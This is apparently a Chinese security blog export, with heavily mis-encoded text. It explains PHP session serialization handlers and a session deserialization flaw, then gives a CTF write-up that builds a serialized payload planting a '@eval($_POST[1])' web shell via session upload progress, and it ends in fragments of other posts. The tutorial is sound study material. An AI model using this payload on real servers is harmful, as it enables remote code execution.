çš„ä¼šè¯IDå­—ç¬¦ä¸­çš„ä½æ•°\n\nsession.save_path&#x3D;â€â€\nè¯¥é…ç½®ä¸»è¦è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„\n\nsession.save_handler&#x3D;â€â€\nè¯¥é…ç½®ä¸»è¦è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®sessionå­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°\n\nsession.use_strict_mode\nä¸¥æ ¼ä¼šè¯æ¨¡å¼ï¼Œä¸¥æ ¼ä¼šè¯æ¨¡å¼ä¸æ¥å—æœªåˆå§‹åŒ–çš„ä¼šè¯IDå¹¶é‡æ–°ç”Ÿæˆä¼šè¯ID\n\nsession.use_cookies\næŒ‡å®šæ˜¯å¦åœ¨å®¢æˆ·ç«¯ç”¨ cookie æ¥å­˜æ”¾ä¼šè¯ IDï¼Œé»˜è®¤å¯ç”¨\n\nsession.cookie_secure\næŒ‡å®šæ˜¯å¦ä»…é€šè¿‡å®‰å…¨è¿æ¥å‘é€ cookieï¼Œé»˜è®¤å…³é—­\n\nsession.use_only_cookies\næŒ‡å®šæ˜¯å¦åœ¨å®¢æˆ·ç«¯ä»…ä»…ä½¿ç”¨cookieæ¥å­˜æ”¾ä¼šè¯ IDï¼Œå¯ç”¨çš„è¯ï¼Œå¯ä»¥é˜²æ­¢æœ‰å…³é€šè¿‡ URL ä¼ é€’ä¼šè¯ ID çš„æ”»å‡»\n\nsession.name\næŒ‡å®šä¼šè¯åä»¥ç”¨åš cookie çš„åå­—ï¼Œåªèƒ½ç”±å­—æ¯æ•°å­—ç»„æˆï¼Œé»˜è®¤ä¸º PHPSESSID\n\nsession.auto_start\næŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œä¸å¯åŠ¨\n\nsession.cookie_lifetime\næŒ‡å®šäº†å‘é€åˆ°æµè§ˆå™¨çš„ cookie çš„ç”Ÿå‘½å‘¨æœŸï¼Œå•ä½ä¸ºç§’ï¼Œå€¼ä¸º 0 è¡¨ç¤ºâ€œç›´åˆ°å…³é—­æµè§ˆå™¨â€ã€‚é»˜è®¤ä¸º 0\n\nsession.cookie_path\næŒ‡å®šè¦è®¾ç½®ä¼šè¯cookie çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º &#x2F;\n\nsession.cookie_domain\næŒ‡å®šè¦è®¾ç½®ä¼šè¯cookie çš„åŸŸåï¼Œé»˜è®¤ä¸ºæ— ï¼Œè¡¨ç¤ºæ ¹æ® cookie è§„èŒƒäº§ç”Ÿcookieçš„ä¸»æœºå\n\nsession.cookie_httponly\nå°†Cookieæ ‡è®°ä¸ºåªèƒ½é€šè¿‡HTTPåè®®è®¿é—®ï¼Œå³æ— æ³•é€šè¿‡è„šæœ¬è¯­è¨€ï¼ˆä¾‹å¦‚JavaScriptï¼‰è®¿é—®Cookieï¼Œæ­¤è®¾ç½®å¯ä»¥æœ‰æ•ˆåœ°å¸®åŠ©é€šè¿‡XSSæ”»å‡»å‡å°‘èº«ä»½ç›—ç”¨\n\nsession.serialize_handler\nå®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨phpï¼Œè¿˜æœ‰å…¶ä»–å¼•æ“ï¼Œä¸”ä¸åŒå¼•æ“çš„å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒï¼Œå…·ä½“å¯è§ä¸‹æ–‡æ‰€è¿°\n\nsession.gc_probability\nè¯¥é…ç½®é¡¹ä¸ session.gc_divisor åˆèµ·æ¥ç”¨æ¥ç®¡ç† garbage collectionï¼Œå³åƒåœ¾å›æ”¶è¿›ç¨‹å¯åŠ¨çš„æ¦‚ç‡\n\nsession.gc_divisor\nè¯¥é…ç½®é¡¹ä¸session.gc_probabilityåˆèµ·æ¥å®šä¹‰äº†åœ¨æ¯ä¸ªä¼šè¯åˆå§‹åŒ–æ—¶å¯åŠ¨åƒåœ¾å›æ”¶è¿›ç¨‹çš„æ¦‚ç‡\n\nsession.gc_maxlifetime\næŒ‡å®šè¿‡äº†å¤šå°‘ç§’ä¹‹åæ•°æ®å°±ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€å¹¶è¢«æ¸…é™¤ï¼Œåƒåœ¾æœé›†å¯èƒ½ä¼šåœ¨sessionå¯åŠ¨çš„æ—¶å€™å¼€å§‹ï¼ˆ å–å†³äºsession.gc_probability å’Œ session.gc_divisorï¼‰\n\nsession.referer_check\nåŒ…å«æœ‰ç”¨æ¥æ£€æŸ¥æ¯ä¸ª HTTP Refererçš„å­ä¸²ã€‚å¦‚æœå®¢æˆ·ç«¯å‘é€äº†Refererä¿¡æ¯ä½†æ˜¯åœ¨å…¶ä¸­å¹¶æœªæ‰¾åˆ°è¯¥å­ä¸²ï¼Œåˆ™åµŒå…¥çš„ä¼šè¯ ID ä¼šè¢«æ ‡è®°ä¸ºæ— æ•ˆã€‚é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²\n\nsession.cache_limiter\næŒ‡å®šä¼šè¯é¡µé¢æ‰€ä½¿ç”¨çš„ç¼“å†²æ§åˆ¶æ–¹æ³•ï¼ˆnone/nocache/private/private_no_expire/publicï¼‰ã€‚é»˜è®¤ä¸º nocache\n\nsession.cache_expire\nä»¥åˆ†é’Ÿæ•°æŒ‡å®šç¼“å†²çš„ä¼šè¯é¡µé¢çš„å­˜æ´»æœŸï¼Œæ­¤è®¾å®šå¯¹nocacheç¼“å†²æ§åˆ¶æ–¹æ³•æ— æ•ˆã€‚é»˜è®¤ä¸º 180\n\nsession.use_trans_sid\næŒ‡å®šæ˜¯å¦å¯ç”¨é€æ˜ SID æ”¯æŒã€‚é»˜è®¤ç¦ç”¨\n\nsession.sid_length\né…ç½®ä¼šè¯IDå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ ä¼šè¯IDçš„é•¿åº¦å¯ä»¥åœ¨22åˆ°256ä¹‹é—´ã€‚é»˜è®¤å€¼ä¸º32ã€‚\n\nsession.trans_sid_tags\næŒ‡å®šå¯ç”¨é€æ˜sidæ”¯æŒæ—¶é‡å†™å“ªäº›HTMLæ ‡ç­¾ä»¥åŒ…æ‹¬ä¼šè¯ID\n\nsession.trans_sid_hosts\næŒ‡å®šå¯ç”¨é€æ˜sidæ”¯æŒæ—¶é‡å†™çš„ä¸»æœºï¼Œä»¥åŒ…æ‹¬ä¼šè¯ID\n\nsession.sid_bits_per_character\né…ç½®ç¼–ç çš„ä¼šè¯IDå­—ç¬¦ä¸­çš„ä½æ•°\n\nsession.upload_progress.enabled\nå¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ï¼Œ é»˜è®¤å¯ç”¨ã€‚\n\nsession.upload_progress.cleanup\nè¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨\n\nsession.upload_progress.prefix\né…ç½®$ _SESSIONä¸­ç”¨äºä¸Šä¼ è¿›åº¦é”®çš„å‰ç¼€ï¼Œé»˜è®¤ä¸ºupload_progress_\n\nsession.upload_progress.name\n$ _SESSIONä¸­ç”¨äºå­˜å‚¨è¿›åº¦ä¿¡æ¯çš„é”®çš„åç§°ï¼Œé»˜è®¤ä¸ºPHP_SESSION_UPLOAD_PROGRESS\n\nsession.upload_progress.freq\nå®šä¹‰åº”è¯¥å¤šé•¿æ—¶é—´æ›´æ–°ä¸€æ¬¡ä¸Šä¼ è¿›åº¦ä¿¡æ¯\n\nsession.upload_progress.min_freq\næ›´æ–°ä¹‹é—´çš„æœ€å°å»¶è¿Ÿ\n\nsession.lazy_write\né…ç½®ä¼šè¯æ•°æ®åœ¨æ›´æ”¹æ—¶æ˜¯å¦è¢«é‡å†™ï¼Œé»˜è®¤å¯ç”¨\n\n\nPHP session çš„å­˜å‚¨æœºåˆ¶å‰é¢æœ‰æåˆ°è¿‡,åœ¨phpä¸­,ä¸åŒçš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨,ä¼šå¯¼è‡´ä¸åŒçš„sessionå‚¨å­˜æ–¹å¼ã€‚å› ä¸ºPHP sessionçš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±session.serialize_handleræ¥å®šä¹‰å¼•æ“çš„ã€‚é»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±sess_sessionidæ¥å†³å®šæ–‡ä»¶åã€‚\n\næ–‡ä»¶çš„å†…å®¹ä¸€ç›´éƒ½æ˜¯sessionå€¼ç»è¿‡åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ï¼Œåªæ˜¯æ ¼å¼ç•¥æœ‰å˜åŒ–\n![20191026142445-4dd97c2e-f7b9-1 (&#x2F;images&#x2F;20191026142445-4dd97c2e-f7b9-1 (1).png)](&#x2F;images&#x2F;20191026142445-4dd97c2e-f7b9-1 (1).png)\nsession.serialize_handlerå®šä¹‰çš„å¼•æ“æœ‰ä¸‰ç§ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\n\n\n\nå¤„ç†å™¨åç§°\nå­˜å‚¨æ ¼å¼\n\n\n\nphp\né”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n\n\nphp_binary\né”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n\n\nphp_serialize\nç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„\n\n\nä¸Šè¿°ä¸‰ç§å¤„ç†å™¨ä¸­ï¼Œphp_serializeåœ¨å†…éƒ¨ç®€å•åœ°ç›´æ¥ä½¿ç”¨ serialize/unserializeå‡½æ•°ï¼Œå¹¶ä¸”ä¸ä¼šæœ‰phpå’Œ php_binaryæ‰€å…·æœ‰çš„é™åˆ¶ã€‚ ä½¿ç”¨è¾ƒæ—§çš„åºåˆ—åŒ–å¤„ç†å™¨å¯¼è‡´$_SESSION çš„ç´¢å¼•æ—¢ä¸èƒ½æ˜¯æ•°å­—ä¹Ÿä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦(| å’Œ !) ã€‚\nä¸‹é¢æˆ‘ä»¬å®ä¾‹æ¥çœ‹çœ‹ä¸‰ç§ä¸åŒå¤„ç†å™¨åºåˆ—åŒ–åçš„ç»“æœã€‚\nphpå¤„ç†å™¨é¦–å…ˆæ¥çœ‹çœ‹session.serialize_handlerç­‰äº phpæ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œphpä»£ç å¦‚ä¸‹\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\n\nsession|s:6:&quot;winter&quot;;\n\nsession ä¸º$_SESSION[&#39;session&#39;]çš„é”®åï¼Œ|åä¸ºä¼ å…¥ GET å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼,sä»£è¡¨æ˜¯å­—ç¬¦ä¸²ç±»å‹\nphp_binaryå¤„ç†å™¨å†æ¥çœ‹çœ‹session.serialize_handlerç­‰äº php_binaryæ—¶å€™çš„åºåˆ—åŒ–ç»“æœã€‚\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\nsessions:6:&quot;winter&quot;;\n\nä½†å®é™…ä¸Š,å®ƒåº”è¯¥é•¿æˆè¿™æ ·:\n[0x07]sessions:6:&quot;winter&quot;;\n\nè¿™æ ·ä¸å¥½çœ‹å‡ºåŒºåˆ«,æ”¹ä¸€ä¸‹ä»£ç \n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;sessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\n#sessionsessionsessionsessionsessions:6:&quot;winter&quot;;\n\nè¿™é‡Œè®¾ç½®äº†é”®å€¼é•¿åº¦ä¸º 35ï¼Œ35 å¯¹åº”çš„ ASCII ç ä¸º#ï¼Œæ‰€ä»¥æœ€ç»ˆçš„ç»“æœå°±æ˜¯è¿™æ ·\nphp_serialize å¤„ç†å™¨æ¥çœ‹php_serializeå¯¹sessionçš„å¤„ç†ç»“æœ\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n\na:1:&#123;s:7:&quot;session&quot;;s:6:&quot;winter&quot;;&#125;\n\na:1è¡¨ç¤º$_SESSIONæ•°ç»„ä¸­æœ‰ 1 ä¸ªå…ƒç´ ï¼ŒèŠ±æ‹¬å·é‡Œé¢çš„å†…å®¹å³ä¸ºä¼ å…¥ GET å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼\næ¼æ´åŸç†ä¸€ä¸ªpayloadå¦‚ä¸‹;\n&lt;form action =â€œ upload.phpâ€ method =â€œ POSTâ€ enctype =â€œ multipart / form-dataâ€&gt;    &lt;input type =â€œ hiddenâ€ name =â€œ PHP_SESSION_UPLOAD_PROGRESSâ€ value =â€œ ryatâ€ /&gt;    &lt;input type =â€œ fileâ€ name =â€œ fileâ€ /&gt;    &lt;input type =â€œ submitâ€ /&gt;&lt;/form&gt;\n\nç„¶å$_SESSIONä¸­çš„é”®å€¼å°±ä¼šä¸º$_SESSION[&quot;upload_progress_ryat&quot;]ï¼Œåœ¨ä¼šè¯ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼Œå°†å¯¹ä¼šè¯æ•°æ®è¿›è¡Œåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œåºåˆ—åŒ–æ ¼å¼ç”±php.iniä¸­çš„session.serialize_handleré€‰é¡¹è®¾ç½®ã€‚ è¿™æ„å‘³ç€ï¼Œå¦‚æœåœ¨è„šæœ¬ä¸­è®¾ç½®äº†ä¸åŒçš„serialize_handlerï¼Œé‚£ä¹ˆå¯ä»¥å¯¼è‡´æ³¨å…¥ä»»æ„sessionæ•°æ®ã€‚\nä¸Šé¢çš„è§£é‡Šå¯èƒ½çœ‹èµ·æ¥æœ‰äº›ç»•ï¼Œç®€å•æ¥è¯´phpå¤„ç†å™¨å’Œphp_serializeå¤„ç†å™¨è¿™ä¸¤ä¸ªå¤„ç†å™¨ç”Ÿæˆçš„åºåˆ—åŒ–æ ¼å¼æœ¬èº«æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸¤ä¸ªå¤„ç†å™¨æ··åˆèµ·æ¥ç”¨ï¼Œå°±ä¼šé€ æˆå±å®³ã€‚\nå½¢æˆçš„åŸç†å°±æ˜¯åœ¨ç”¨session.serialize_handler = php_serializeå­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ | , å†ç”¨session.serialize_handler = phpæ ¼å¼å–å‡º$_SESSIONçš„å€¼æ—¶ï¼Œ |ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œåœ¨ç‰¹å®šçš„åœ°æ–¹ä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚\nå®šä¹‰ä¸€ä¸ªsession.phpæ–‡ä»¶ï¼Œç”¨äºä¼ å…¥ sessionå€¼ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\næˆ‘ä»¬ä¼ å…¥hello,å¾—åˆ°çš„sessionå†…å®¹å¦‚ä¸‹:\na:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;\n\næ–°å»ºä¸€ä¸ªclass.phpæ–‡ä»¶\n&lt;?php   error_reporting(0);  ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);  session_start();    class XianZhi&#123;    public $name = &#x27;panda&#x27;;    function __wakeup()&#123;      echo &quot;Who are you?&quot;;    &#125;    function __destruct()&#123;      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;    &#125;  &#125;  $str = new XianZhi(); ?&gt;\n\n\nå®ä¾‹åŒ–å¯¹è±¡åï¼Œè¾“å‡ºäº†panda\nè¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä½œç”¨å¾ˆæ¸…æ™°ï¼Œsession.phpæ–‡ä»¶çš„å¤„ç†å™¨æ˜¯php_serializeï¼Œclass.phpæ–‡ä»¶çš„å¤„ç†å™¨æ˜¯phpï¼Œsession.phpæ–‡ä»¶çš„ä½œç”¨æ˜¯ä¼ å…¥å¯æ§çš„ sessionå€¼ï¼Œclass.phpæ–‡ä»¶çš„ä½œç”¨æ˜¯åœ¨ååºåˆ—åŒ–å¼€å§‹å‰è¾“å‡ºWho are you?ï¼Œååºåˆ—åŒ–ç»“æŸçš„æ—¶å€™è¾“å‡ºnameå€¼ã€‚\nè¿™ä¸¤ä¸ªæ–‡ä»¶å¦‚æœæƒ³è¦åˆ©ç”¨php bug #71101ï¼Œæˆ‘ä»¬è¦åœ¨session.phpæ–‡ä»¶ä¼ å…¥|+åºåˆ—åŒ–æ ¼å¼çš„å€¼ï¼Œç„¶åå†æ¬¡è®¿é—®class.phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨è°ƒç”¨sessionå€¼çš„æ—¶å€™ï¼Œè§¦å‘æ­¤ BUGã€‚\né¦–å…ˆç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ payload å¦‚ä¸‹\n&lt;?phpclass XianZhi&#123;    public $name;    function __wakeup()&#123;      echo &quot;Who are you?&quot;;    &#125;    function __destruct()&#123;      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;    &#125;&#125;    $str = new XianZhi();    $str-&gt;name = &quot;xianzhi&quot;;    echo serialize($str);  ?&gt;\n\npayload:\nO:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;\n\nç„¶åä¼ å…¥session.php,æŸ¥çœ‹ç°åœ¨çš„sessionå€¼\na:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;\n\nå†æ¬¡è®¿é—®class.phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¼šå‘ç°å·²ç»è§¦å‘äº†php bug #71101ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\né‡åˆ°ç«–çº¿ |ï¼Œè®¤ä¸ºå‰é¢æ˜¯é”®åï¼Œåé¢æ˜¯å€¼\n\nä¾‹é¢˜2019 å¹´å·…å³°æå®¢å¤§èµ›lol\nåªåˆ†æsessionååºåˆ—åŒ–éƒ¨åˆ†\nâ”œâ”€â”€ appâ”‚   â”œâ”€â”€ controllerâ”‚   â”‚   â”œâ”€â”€ Files.class.phpâ”‚   â”‚   â””â”€â”€ IndexController.class.phpâ”‚   â”œâ”€â”€ modelâ”‚   â”‚   â””â”€â”€ Download.class.phpâ”‚   â””â”€â”€ viewâ”‚       â””â”€â”€ Cache.class.phpâ”œâ”€â”€ coreâ”‚   â”œâ”€â”€ config.phpâ”‚   â”œâ”€â”€ core.phpâ”‚   â””â”€â”€ func.phpâ”œâ”€â”€ index.phpâ”œâ”€â”€ uploadâ”‚   â””â”€â”€ e9ovitochivkoamlodj6vu9g7gâ””â”€â”€ user\n\nåœ¨config.phpæ–‡ä»¶ä¸­æ‰¾åˆ°æç¤º:\n&lt;?php$config=array(    &#x27;debug&#x27;=&gt;&#x27;false&#x27;,    &#x27;ini&#x27;=&gt;array(        &#x27;session.name&#x27; =&gt; &#x27;PHPSESSID&#x27;,        &#x27;session.serialize_handler&#x27; =&gt; &#x27;php&#x27;    ));\n\nå¯ä»¥çœ‹åˆ°phpå¼•æ“æ˜¯php,åœ¨&#x2F;core&#x2F;core.phpä¸­\n&lt;?phpif(!defined(&#x27;Core_DIR&#x27;))&#123;    exit();&#125;include(Core_DIR.DS.&#x27;config.php&#x27;);include(Core_DIR.DS.&#x27;func.php&#x27;);_if_debug($config[&#x27;debug&#x27;]);spl_autoload_register(&#x27;autoload_class&#x27;);config($config[&#x27;ini&#x27;]);session_start();define(&#x27;Upload_DIR&#x27;,Image_DIR.DS.session_id());init();$app = new IndexController();if(method_exists($app, $app-&gt;data[&#x27;method&#x27;]))&#123;    $app-&gt;&#123;$app-&gt;data[&#x27;method&#x27;]&#125;($app-&gt;data[&#x27;param&#x27;]);&#125;else&#123;    $app-&gt;index();&#125;#$this-&gt;method($_POST)\n\nè‚¯å®šæ˜¯æœ‰åœ°æ–¹è¯»å–äº†session,æ¥ä¸‹æ¥å¯»æ‰¾å¯æ§çš„sessionç‚¹.åœ¨app/model/Cache.class.phpæ–‡ä»¶ä¸­æ‰¾åˆ°\n&lt;?phpclass Cache&#123;    public $data;    public $sj;    public $path;    public $html;    function __construct($data)&#123;        $this-&gt;data[&#x27;name&#x27;]=isset($data[&#x27;post&#x27;][&#x27;name&#x27;])?$data[&#x27;post&#x27;][&#x27;name&#x27;]:&#x27;&#x27;;        $this-&gt;data[&#x27;message&#x27;]=isset($data[&#x27;post&#x27;][&#x27;message&#x27;])?$data[&#x27;post&#x27;][&#x27;message&#x27;]:&#x27;&#x27;;        $this-&gt;data[&#x27;image&#x27;]=!empty($data[&#x27;image&#x27;])?$data[&#x27;image&#x27;]:&#x27;/static/images/pic04.jpg&#x27;;        $this-&gt;path=Cache_DIR.DS.session_id().&#x27;.php&#x27;;    &#125;    function __destruct()&#123;        $this-&gt;html=sprintf(&#x27;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; /&gt;&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/noscript.css&quot; /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class=&quot;is-preload&quot;&gt;&lt;div id=&quot;wrapper&quot;&gt;&lt;header id=&quot;header&quot;&gt; &lt;div class=&quot;logo&quot;&gt;&lt;span class=&quot;icon fa-diamond&quot;&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class=&quot;content&quot;&gt;&lt;div class=&quot;inner&quot;&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href=&quot;#you&quot;&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id=&quot;main&quot;&gt;&lt;article id=&quot;you&quot;&gt;    &lt;h2 class=&quot;major&quot; ng-app&gt;%s&lt;/h2&gt;    &lt;span class=&quot;image main&quot;&gt;&lt;img src=&quot;%s&quot; alt=&quot;&quot; /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=location.href=&quot;/download/%s&quot;&gt;ä¸‹è½½&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id=&quot;footer&quot;&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/browser.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/breakpoints.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/util.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/angular.js&quot;&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;&#x27;,substr($this-&gt;data[&#x27;name&#x27;],0,62),$this-&gt;data[&#x27;image&#x27;],$this-&gt;data[&#x27;message&#x27;],session_id().&#x27;.jpg&#x27;);        if(file_put_contents($this-&gt;path,$this-&gt;html))&#123;            include($this-&gt;path);        &#125;    &#125;&#125;\n\nè¿™é‡Œçš„nameå’Œmessageæ˜¯å¯æ§çš„,ç„¶åå°†å¾—åˆ°çš„å†…å®¹ä¼ å…¥åˆ°pathä¸­å¹¶ä¸”åŒ…å«,payload:\n&lt;?phpclass Cache&#123;    public $data ;    public $sj;    public $path = &#x27;/var/www/html/1.php&#x27;;    public $html;&#125;    $str = new Cache();    $str-&gt;data= [    &quot;name&quot; =&gt; &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;,    &quot;message&quot; =&gt; &quot;panda&quot;,    &quot;image&quot; =&gt; &quot;panda&quot;];    echo serialize($str);?&gt;\n\nå¾—åˆ°å­—ç¬¦ä¸²:\nO:5:&quot;Cache&quot;:4:&#123;s:4:&quot;data&quot;;a:3:&#123;s:4:&quot;name&quot;;s:16:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;;s:7:&quot;message&quot;;s:5:&quot;panda&quot;;s:5:&quot;image&quot;;s:5:&quot;panda&quot;;&#125;s:2:&quot;sj&quot;;N;s:4:&quot;path&quot;;s:19:&quot;/var/www/html/1.php&quot;;s:4:&quot;html&quot;;N;&#125;\n\nç„¶ååœ¨å‰é¢Oå‡ºåŠ ä¸Š|æ¬ºéª—sessionååºåˆ—åŒ–å¼•æ“,å½“ç”¨é»˜è®¤phpå¼•æ“è¯»å–æ˜¯,|ä¼šå°†å…¶åçš„ O:5:&quot;Cache&quot;...å½“ä½œå€¼ååºåˆ—åŒ–ã€‚\nå†å»ºç«‹up.htmlæ–‡ä»¶\n&lt;form action=&quot;http://10.37.14.49/1.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;panda&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;\n\nç”¨æ¥æäº¤æˆ‘ä»¬çš„payload,æŠ“åŒ…,æäº¤payload\n\nç”±äºè¯·æ±‚åï¼Œsessionä¼šç«‹åˆ»è¢«æ¸…ç©ºè¦†ç›–,å‘åˆ°çˆ†ç ´æ¨¡å—å‘é€NULL payloadå³å¯\nç„¶å1.phpå°±ä¼šè¢«ä¿®æ”¹ä¸º\n\næ‹¿åˆ°shellåç›´æ¥è¯»flagå³å¯\n","categories":["session ååºåˆ—åŒ– php"],"tags":["session ååºåˆ—åŒ–"]},{"title":"å¤§æ¨¡å‹å®‰å…¨ä¹‹æ•°æ®æŠ•æ¯’","url":"/2025/09/18/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%8A%95%E6%AF%92/","content":""},{"title":"äº¬æ´¥å†€é•¿åŸæ¯åˆèµ›wp","url":"/2025/09/17/%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/","content":"äº¬æ´¥å†€ccbæ–‡æ›²ç­¾å­¦f12å¾—åˆ°é€»è¾‘ä»£ç \nconst fnKey = document.getElementById(&#x27;fnKey&#x27;);const capsKey = document.getElementById(&#x27;capsKey&#x27;);const searchKey = document.getElementById(&#x27;searchKey&#x27;);const clearKey = document.getElementById(&#x27;clearKey&#x27;);const inputBox = document.getElementById(&#x27;inputBox&#x27;);const screenContent = document.getElementById(&#x27;screenContent&#x27;);const debugHint = document.getElementById(&#x27;debugHint&#x27;);const capsHint = document.getElementById(&#x27;capsHint&#x27;);const keys = document.querySelectorAll(&#x27;.key&#x27;);const menuKey = document.getElementById(&#x27;menuKey&#x27;);const backKey = document.getElementById(&#x27;backKey&#x27;);// çŠ¶æ€å˜é‡let debugMode = false;let isUpperCase = true; // é»˜è®¤å¤§å†™let fnPressTimer = null;const FN_HOLD_DURATION = 1500; // é•¿æŒ‰Fné”®æ¿€æ´»è°ƒè¯•æ¨¡å¼çš„æ—¶é—´(æ¯«ç§’)let isMenuActive = false; // èœå•æ¿€æ´»çŠ¶æ€ï¼ˆtrue=å¤„äºèœå•é€‰æ‹©ä¸­ï¼Œfalse=æ™®é€šè¾“å…¥ï¼‰// 